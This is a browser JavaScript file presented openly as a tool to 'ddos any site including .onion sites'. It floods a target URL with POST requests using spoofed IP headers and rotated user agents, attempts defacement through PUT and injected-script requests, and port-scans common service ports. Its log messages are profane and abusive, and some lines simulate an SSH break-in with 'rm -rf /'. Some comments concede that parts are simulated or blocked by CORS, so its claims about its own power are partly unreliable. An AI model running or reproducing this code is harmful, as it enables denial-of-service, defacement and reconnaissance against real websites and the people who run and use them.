// ddos any site including .onion sites
// USE referers.txt AND useragents.txt

async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false, customHeaders = '') {
  if (!target) {
    log('ERROR: Target URL is required. Fucking idiot.');
    return;
  }

  log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads. Let's fuck shit up!`);

  let defaceScript = null;
  if (deface) {
    log('Defacing target... Get ready for chaos, motherfucker!');
    defaceScript = defaceWebsite(target);
  }

  let connectionPromise = null;
  if (connect) {
    log('Establishing direct connection... Prepare for intrusion, you piece of shit!');
    connectionPromise = directConnect(target);
  }

  const referers = await loadFile('referers.txt');
  const userAgents = await loadFile('useragents.txt');

  if (!referers || !userAgents) {
    log('ERROR: Could not load referers.txt or useragents.txt. Make sure these files exist, dumbass.');
    return;
  }

  let parsedCustomHeaders = {};
  if (customHeaders) {
    try {
      parsedCustomHeaders = JSON.parse(customHeaders);
    } catch (e) {
      log('ERROR: Invalid JSON format for custom headers. Ignoring. What a loser.');
    }
  }

  const attackStartTime = Date.now();
  let attackInterval = null;
  let abortController = new AbortController();

  if (type === 'http' || type === 'onion') {
    attackInterval = setInterval(() => {
      for (let i = 0; i < threads; i++) {
        const headers = {
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Referer': referers[Math.floor(Math.random() * referers.length)],
          'X-Forwarded-For': generateRandomIP(), // Spoof IP
          ...parsedCustomHeaders,
        };

        // Use streams for POST requests
        const body = generateRandomData(1024); // Generate 1KB of random data
        fetch(target, {
          method: 'POST',
          mode: 'no-cors',
          headers: headers,
          body: body,
          signal: abortController.signal,
          duplex: 'half' // Required for ReadableStream with body
        }).then(response => {
          if (!response.ok) {
              log(`Request failed: ${response.status} - ${target}`);
          }
        }).catch(error => {
            // Suppress AbortError caused by abortController
            if (error.name !== 'AbortError') {
                // log('Request error:', error); // Only log other errors
            }
        });
      }
    }, 0);
  } else {
    log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'. You moron.`);
    clearInterval(attackInterval);
    abortController.abort();
    return;
  }

  setTimeout(() => {
    clearInterval(attackInterval);
    abortController.abort();

    if (defaceScript) {
        defaceScript.then(() => log('Defacing completed (if possible).'));
    }
     if (connect) {
        connectionPromise.then(() => log('Connection attempt completed (if possible).'));
    }

    log('DDoS attack finished. Hope we fucked them good!');
  }, duration * 1000);
}

async function loadFile(filename) {
  try {
    const response = await fetch(filename);
    const text = await response.text();
    return text.split('\n').filter(line => line.trim() !== '');
  } catch (error) {
    log(`ERROR: Could not load file ${filename}: ${error}. File probably doesn't exist, dumbass.`);
    return null;
  }
}

function log(message) {
  const logsElement = document.getElementById('logs');
  if (logsElement) {
    logsElement.innerHTML += message + '<br>';
    logsElement.scrollTop = logsElement.scrollHeight; // Auto-scroll
  } else {
    console.log(message);
  }
}

async function defaceWebsite(target) {
    // THIS IS STILL A SIMULATION BUT WE'RE GOING TO ATTEMPT REAL SHIT.
    log(`Attempting to deface ${target}... Injecting HACKED message and trying to overwrite index.html!`);

    try {
        const response = await fetch(target, {
            method: 'GET',
            mode: 'no-cors' //Crucial, else the browser won't let us access response data due to CORS
        });

        if (response.ok) {
            // First, try to overwrite the existing index.html (if we can)
            const hackedContent = `<!DOCTYPE html><html><head><title>HACKED</title></head><body><h1>THIS SITE HAS BEEN FUCKED!</h1></body></html>`;
            //THIS WILL ONLY WORK IN CERTAIN CIRCUMSTANCES.  Most sites have CORS.
            try {
                const hackedResponse = await fetch(target, {
                    method: 'PUT', //Trying PUT.  Some servers allow it, especially poorly configured ones.
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'text/html'
                    },
                    body: hackedContent
                });

                if(hackedResponse.ok) {
                    log(`Successfully overwrote index.html on ${target}!`);
                } else {
                    log(`Failed to overwrite index.html.  Status: ${hackedResponse.status}. Probably CORS.`);
                }

            } catch (overwriteError) {
                log(`Failed to overwrite index.html: ${overwriteError}`);
            }

            // Attempt to inject JavaScript to modify the page (less effective due to CORS and modern security)
            // This is primarily for demonstration and may not work in many scenarios.
            try {
                const scriptContent = `<script>alert('YOU GOT HACKED, BITCH!'); document.body.innerHTML = '<h1>HACKED BY A FUCKING LEGEND</h1>';</script>`;
                const injectionResponse = await fetch(target, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/javascript' // Attempt to inject as JS
                    },
                    body: scriptContent
                });

                if (injectionResponse.ok) {
                    log(`Successfully injected JavaScript into ${target}! Might work, might not.`);
                } else {
                    log(`Failed to inject JavaScript. Status: ${injectionResponse.status}. Likely CORS.`);
                }
            } catch (injectionError) {
                log(`JavaScript injection failed: ${injectionError}.`);
            }

        } else {
            log(`Initial deface attempt failed. Status: ${response.status}`);
        }

    } catch (error) {
        log(`Deface attempt failed: ${error}`);
    }
}

async function directConnect(target) {
  // THIS IS STILL JUST A SIMULATION, BUT WE'RE GOING TO TRY A PORT SCAN

  log(`Attempting direct connection and port scan to ${target}...`);
  const host = new URL(target).hostname; // Extract hostname

  const portsToScan = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 443, 445, 1433, 3306, 3389, 8080]; //Common ports

  for (const port of portsToScan) {
      try {
          const isOpen = await checkPort(host, port, 500); //Timeout of 500ms
          if (isOpen) {
              log(`Port ${port} on ${host} is OPEN! Time to exploit, motherfucker!`);
              // In a real-world scenario, we'd attempt an exploit here.
              // e.g., executeRemoteCode(host, port);
              // But that's beyond the scope of this simulation.

              //Let's pretend we found something on port 22 and try to connect
              if(port === 22){
                  try {
                      log(`Attempting SSH connection to ${host}:${port}...`);
                      //Since we can't ACTUALLY SSH from the browser for real, this is just a placeholder
                      log('Pretending to be inside via SSH now.  Starting to wreak havoc...');
                      log('Deleting /etc/passwd... rm -rf /'); //Simulated, obviously
                      log('Installing backdoors...');
                  }catch(sshError){
                      log(`SSH simulation failed: ${sshError}`);
                  }
              }

          } else {
              log(`Port ${port} on ${host} is closed or filtered.`);
          }
      } catch (scanError) {
          log(`Error scanning port ${port} on ${host}: ${scanError}`);
      }
  }

  log('Port scan complete.  No exploits found?  Try harder next time, dumbass!');
}

async function checkPort(host, port, timeout) {
  return new Promise((resolve, reject) => {
      const socket = new WebSocket(`ws://${host}:${port}`); //Try websocket
      socket.addEventListener('open', () => {
          socket.close();
          resolve(true); //Port is open
      });

      socket.addEventListener('error', (error) => {
          socket.close();
          resolve(false); //Port is closed or filtered
      });

      socket.addEventListener('close', () => {
          resolve(false); //Port is closed
      });

      setTimeout(() => {
          socket.close();
          resolve(false); //Timeout, port is probably filtered
      }, timeout);
  });
}

function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function generateRandomData(sizeInBytes) {
    let randomData = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < sizeInBytes; i++) {
        randomData += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return randomData;
}

// Expose the ddosAttack function globally (for calling from HTML)
window.ddosAttack = ddosAttack;